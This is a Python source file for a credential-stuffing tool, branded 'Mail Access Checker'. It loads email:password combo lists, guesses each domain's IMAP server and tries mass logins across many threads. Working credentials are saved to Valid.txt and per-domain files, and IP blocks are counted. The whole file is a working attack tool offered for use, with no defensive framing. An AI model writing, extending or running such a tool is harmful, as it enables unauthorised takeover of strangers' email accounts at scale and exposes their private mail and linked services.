import imaplib
import json
import threading
import queue
import time
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
import socket

init()

results = {
    "hits": 0,
    "bad": 0,
    "error": 0,
    "blockip": 0
}

valid_domains = set()
lock = threading.Lock()
combo_queue = queue.Queue()

def load_config():
    try:
        with open("config.json", "r") as f:
            config = json.load(f)
        return int(config.get("thread", 50))
    except FileNotFoundError:
        default_config = {"thread": 50}
        with open("config.json", "w") as f:
            json.dump(default_config, f, indent=4)
        return 50
    except:
        return 50

def get_imap_server(email):
    domain = email.split("@")[-1].lower()
    try:
        prefixes = ["imap.", "mail.", "imap-mail.", ""]
        for prefix in prefixes:
            try:
                server = f"{prefix}{domain}"
                socket.gethostbyname(server)
                return server
            except socket.gaierror:
                continue
        return f"imap.{domain}"
    except:
        return f"imap.{domain}"

def check_email(email, password):
    date_folder = f"rules-{datetime.now().strftime('%d-%m-%Y')}"
    rules_domin_folder = os.path.join(date_folder, "Rules-Domin")
    try:
        imap_server = get_imap_server(email)
        imap = imaplib.IMAP4_SSL(imap_server, timeout=10)
        imap.login(email, password)
        imap.logout()
        domain = email.split("@")[-1].lower()
        with lock:
            results["hits"] += 1
            valid_domains.add(domain)
            os.makedirs(date_folder, exist_ok=True)
            os.makedirs(rules_domin_folder, exist_ok=True)
            with open(os.path.join(date_folder, "Valid.txt"), "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
            with open(os.path.join(rules_domin_folder, "Domin1.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(sorted(valid_domains)) + "\n")
            with open(os.path.join(rules_domin_folder, f"{domain}.txt"), "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        return "hit"
    except imaplib.IMAP4.error as e:
        error_msg = str(e).lower()
        os.makedirs(date_folder, exist_ok=True)
        with lock:
            if "invalid" in error_msg or "incorrect" in error_msg:
                results["bad"] += 1
                with open(os.path.join(date_folder, "Bad.txt"), "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
            elif "blocked" in error_msg or "access denied" in error_msg:
                results["blockip"] += 1
                with open(os.path.join(date_folder, "Block.txt"), "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
            else:
                results["error"] += 1
                with open(os.path.join(date_folder, "Erro.txt"), "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
        return "bad"
    except:
        os.makedirs(date_folder, exist_ok=True)
        with lock:
            results["error"] += 1
            with open(os.path.join(date_folder, "Erro.txt"), "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        return "error"

def display_panel():
    while True:
        with lock:
            os.system("cls" if os.name == "nt" else "clear")
            print(Fore.GREEN + f"[ HITS ] -> [ {results['hits']} ]" + Style.RESET_ALL)
            print(Fore.RED + Style.BRIGHT + f"[ BAD ] -> [ {results['bad']} ]" + Style.RESET_ALL)
            print(Fore.RED + f"[ ERRO ] -> [ {results['error']} ]" + Style.RESET_ALL)
            print(Fore.YELLOW + f"[ BLOCKIP ] -> [ {results['blockip']} ]" + Style.RESET_ALL)
        time.sleep(1)

def worker():
    while not combo_queue.empty():
        try:
            email, password = combo_queue.get_nowait()
            check_email(email, password)
        except queue.Empty:
            break
        finally:
            combo_queue.task_done()

def main():
    os.system("cls" if os.name == "nt" else "clear")
    num_threads = load_config()
    print("""
\x1b[38;2;255;255;255m 𝙄𝘿 : 193829 | 𝙈𝘼𝙄𝙇 𝘼𝘾𝙀𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝙑1 | 𝘿𝙀𝙑 𝘽𝙔 @𝘿𝘼𝙏𝙑𝙐𝙇𝙐𝘾𝙆𝙆𝙔𝙎𝙏𝙊𝙋
\x1b[38;2;0;255;0m         _   _  ____ _   _       __  __ _____  __
\x1b[38;2;255;255;255m        | | | |/ ___| | | |     |  \/  |_ _\ \/ /
\x1b[38;2;0;128;0m        | | | | |  _| |_| |_____| |\/| || | \  / 
\x1b[38;2;255;255;255m        | |_| | |_| |  _  |_____| |  | || | /  \ 
\x1b[38;2;0;128;0m         \___/ \____|_| |_|     |_|  |_|___/_/\_\ 
\x1b[38;2;255;255;255m   \x1b[38;2;255;255;255[ Checker Mail Aces - by \x1b[38;2;0;128;0m@datvuluckkystop \x1b[38;2;255;255;255]
          
          
          """)
    combo_file = input("\x1b[38;2;0;255;0mE\x1b[38;2;255;255;255mnt\x1b[38;2;0;255;0me\x1b[38;2;255;255;255mr \x1b[38;2;0;255;0mC\x1b[38;2;255;255;255mo\x1b[38;2;0;255;0mmb\x1b[38;2;0;255;0mo : ")
    if not os.path.exists(combo_file):
        print(Fore.RED + "Not Found Combo" + Style.RESET_ALL)
        return
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                email, password = line.split(":", 1)
                combo_queue.put((email.strip(), password.strip()))
    panel_thread = threading.Thread(target=display_panel, daemon=True)
    panel_thread.start()
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker) for _ in range(num_threads)]
    combo_queue.join()
    with lock:
        os.system("cls" if os.name == "nt" else "clear")
        print(Fore.GREEN + f"[ HITS ] -> [ {results['hits']} ]" + Style.RESET_ALL)
        print(Fore.RED + Style.BRIGHT + f"[ BAD ] -> [ {results['bad']} ]" + Style.RESET_ALL)
        print(Fore.RED + f"[ ERRO ] -> [ {results['error']} ]" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[ BLOCKIP ] -> [ {results['blockip']} ]" + Style.RESET_ALL)
        print(f"Save Folder rules-{datetime.now().strftime('%d-%m-%Y')} và {os.path.join('rules-' + datetime.now().strftime('%d-%m-%Y'), 'Rules-Domin')}")

if __name__ == "__main__":
    main()